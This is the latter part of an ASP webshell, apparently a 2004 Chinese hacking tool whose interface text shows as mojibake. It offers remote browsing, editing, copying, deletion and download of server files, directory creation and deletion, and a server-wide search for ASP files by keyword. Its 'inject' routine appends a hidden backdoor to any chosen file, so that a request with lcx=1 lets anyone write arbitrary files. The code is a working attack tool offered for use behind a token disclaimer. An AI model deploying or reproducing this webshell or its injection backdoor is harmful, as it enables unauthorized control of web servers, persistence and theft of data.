<%Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>��<font color='#FF8000'>��</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >��</font>ɾ��</a><br>"
Next
end if
%>
</TD>
<TD  width="45%"  bgColor=#EEEEEE>�ļ��� ������Ƶ��ļ������Բ鿴���ļ������ԣ�</TD>
<TD width="11%" bgColor=#EEEEEE>��С���ֽڣ�</TD>
<TD width="18%" bgColor=#EEEEEE>�ļ�����</TD>
</TR>
<TR>
<TD height=200 colspan="3" valign="top" bgColor=#EEEEEE>
<%
dim theFiles
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<strong>"&x.Name&"</strong>"
else
showstring="<a href='"&lpath&x.Name&"' title='"&"����"&x.type&chr(10)&"����"&x.Attributes&chr(10)&"ʱ�䣺"&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#FF8000'>��</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'><a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;edit</a><a href="&chr(34)&"javascript: copyfile('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' ></font>&nbsp;copy</a><a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;del</a><a href='"&url&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;down</a><a href='"&url&"?id=inject&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;inject</a></td></tr>"
Next
end if
Response.write"</table>"
%>
</TD>
</TR></TBODY>
</TABLE>
<% end sub
sub edit()
if request("op")="del"  then
'**********ɾ���ļ�********
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<br><center>ɾ���ɹ���Ҫˢ�²��ܿ���Ч��.</center>"
'**********ɾ���ļ�����********
else
if request("op")="copy" then
'**********�����ļ�********
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<center><p>Դ�ļ���"+whichfile+"</center>"
Response.write "<center><br>Ŀ���ļ���"+dsfile+"</center>"
Response.write "<center><br>���Ƴɹ���Ҫˢ�²��ܿ���Ч��!</p></center>"
'**********�����ļ�����********
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.OpenTextFile(whichfile, 1, False)
counter=0
thisline=thisfile.readall
thisfile.Close
set fs=nothing
end if
%>
<form method="POST" action=""&url&"?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<br>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0 class="noborder">
<TBODY>
<TR >
<TD
height=22 bgcolor="#EEEEEE" ><div align="center">����������ASPľ���2004�ļ��༭��</div></TD>
</TR>
<TR >
<TD width="100%"
height=22 bgcolor="#EEEEEE" >�ļ�����
<input type="text" name="path" size="45"
value="<%=Request("path")%>"readonly>
</TD>
</TR>
<TR>
<TD
height=22 bgcolor="#EEEEEE" > <div align="center">
<textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
</div></TD>
</TR>
<TR>
<TD
height=22 bgcolor="#EEEEEE" ><div align="center">
<input type="submit"
value="�ύ" name="B1">
<input type="reset" value="��ԭ" name="B2">
</div></TD>
</TR>
</TABLE>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(whichfile)
outfile.WriteLine Request("text")
outfile.close
set fs=nothing
Response.write "<center>�޸ĳɹ���Ҫˢ�²��ܿ���Ч��!</center>"
end if
end if
end if
end sub
end if
%>
<% sub dir()
if request("op")="del"  then
'***********ɾ��Ŀ¼**********
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder whichdir,True
Response.write "<center>ɾ���ɹ���Ҫˢ�²��ܿ���Ч����ɾ����Ŀ¼Ϊ:<b>"&whichdir&"</b></center>"
'**********ɾ��Ŀ¼����*************
else
'***********�½�Ŀ¼**********
if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.CreateFolder whichdir
Response.write "<center>�����ɹ���Ҫˢ�²��ܿ���Ч��,������Ŀ¼Ϊ:<b>"&whichdir&"</b></center>"
'***********�½�Ŀ¼����**********
end if
end if
end sub
'****�����ļ�
function downloadFile(strFile)
if  request("attrib")="" then
strFilename = server.MapPath(strFile)
end if
if  request("attrib")="true" then
strFilename = Request("path")
end if
Response.Buffer = True
Response.Clear
Set s = Server.CreateObject("ADODB.Stream")
s.Open
s.Type = 1
on error resume next
Set fso = Server.CreateObject("Scripting.FileSystemObject")
 if not fso.FileExists(strFilename) then
  Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
  Response.End
 end if
 Set f = fso.GetFile(strFilename)
 intFilelength = f.size
s.LoadFromFile(strFilename)
 if err then
  Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
  Response.End
 end if
 Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
 Response.AddHeader "Content-Length", intFilelength
 Response.CharSet = "UTF-8"
 Response.ContentType = "application/octet-stream"
  Response.BinaryWrite s.Read
 Response.Flush
 s.Close
 Set s = Nothing
 response.end
End Function 
function out() 
session("password")=""
response.redirect ""&Co&"" 
response.end 
End Function

%>
<%
sub inject()
if Request("id")="inject"  and request("attrib")<>"true"then
testfile=Server.MapPath(""&Request("path")&"")
set fs=server.CreateObject("scripting.filesystemobject")
set thisfile=fs.OpenTextFile(testfile,8,True,0)
thisfile.WriteLine("<%")
thisfile.WriteLine("if Request(""lcx"")=""1"" then")
thisfile.WriteLine("dim allen,creat,text,thisline,path")
thisfile.WriteLine("if Request(""creat"")=""yes"" then")
thisfile.WriteLine("Set fs = CreateObject(""Scripting.FileSystemObject"") ")
thisfile.WriteLine("Set outfile=fs.CreateTextFile(server.mappath(Request(""path"")))")
thisfile.WriteLine("outfile.WriteLine Request(""text"")")
thisfile.WriteLine("Response.write ""succeed!""")
thisfile.WriteLine("end if")
thisfile.WriteLine("Response.write ""<form method='POST'action='""&Request.ServerVariables(""URL"")&""?allen=1&creat=yes'>""")
thisfile.WriteLine("Response.write ""<textarea name='text'>""&thisline&""</textarea><br>""")
thisfile.WriteLine("Response.write ""<input type='text' name='path' value='""&Request(""path"")&""'>""")
thisfile.WriteLine("Response.write ""<input name='submit' type='submit' value='ok' ></form>""")
thisfile.WriteLine("Response.end")
thisfile.WriteLine("end if ")
thisfile.WriteLine("%" & ">")
thisfile.close
Response.write "succeed!����"&Request("path")&"?lcx=1�������������ļ�"
else 
Response.write "<form method='POST' action='"&Request.ServerVariables("URL")&"?id=inject'>"
Response.write "<input type='text' name='path' readonly value='"&Request("path")&"'>"
Response.write "<input name='submit' type='submit' value='���������ʲôѽ����������Ŀ¼�ļ���' ></form>"
end if
end sub
%>
<%
SearchString = Request("SearchString")
count=0
'�ѵ�ǰĿ¼��ʵ��·��ת��Ϊ����·��
'Function UnMapPath( Path )
'UnMapPath = Replace(Mid(Path, Len(Server.MapPath("/")) + 1), "\", "/")
'End Function
Function SearchFile( f, s, title )
Set fo = fs.OpenTextFile(f)
content = fo.ReadAll'��ȫ���ı���content
fo.Close
SearchFile = InStr(1, content, S, vbTextCompare) > 0 '�ӵ�һ���ַ���ʼ���content�����Ƿ���S
If SearchFile Then'�����,������ļ�TITLE�������
pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
title = ""
If pos1 > 0 And pos2 > 0 Then'ȡTITLE����м���ַ�
title = Mid( content, pos1 + 7, pos2 - pos1 - 7 )
End If
End If
End Function
Function FileLink( f, title )
vPath =f.Path'ȡ·��
If title = "" Then title = f.Name'������
'FileLink = "<A HREF=""" & vPath & """>" & title & "</A>"
FileLink = vPath 
FileLink = "<UL>��" & FileLink & "</UL>"
End Function
Sub SearchFolder( fd, s )
found = False
For each f In fd.Files
pos = InStrRev(f.Path, "." )
If pos > 0 Then
ext = Mid(f.Path, pos + 1 )
Else
ext = ""
End If
If LCase(ext) = "asp" or LCase(ext) = "asa" or LCase(ext) = "cer" Then'
If SearchFile( f, s, title ) Then
Response.Write FileLink(f, title)
count=count+1
End If
End If
Next
For each sfd In fd.SubFolders
SearchFolder sfd, s
Next
End Sub
%>
<br>
<CENTER>���棺�ԷǷ�ʹ�ô˳�����ܴ������κβ�����������Ը�������������<br></center>
<center>��л���������ߡ������ϴ���CZY����cmd.asp���ߡ�sun.c������һ��Ŭ����LCX&ALLEN��</center>
<center><form action="<%= Request.ServerVariables("URL") %>" method="Get">
�ؼ��������� <input type="text" size="12" name="SearchString" value="<%=SearchString%>"> <input type="text" size="12" name="path88" value=����·����c:\><input
type="submit" value="�����ڼ������ڵ�aspľ��"> 
</form><%
Set fs = Server.CreateObject("Scripting.FileSystemObject")
Set fd = fs.GetFolder(Request("path88")&"\")
If SearchString <> "" Then
Response.Write "<H2>�����ļ���Ƕ��������<font color=red>" & SearchString & "</font>�ؼ��֣�</H2><P>"
SearchFolder fd,SearchString
End If
%></center></body>
</html>

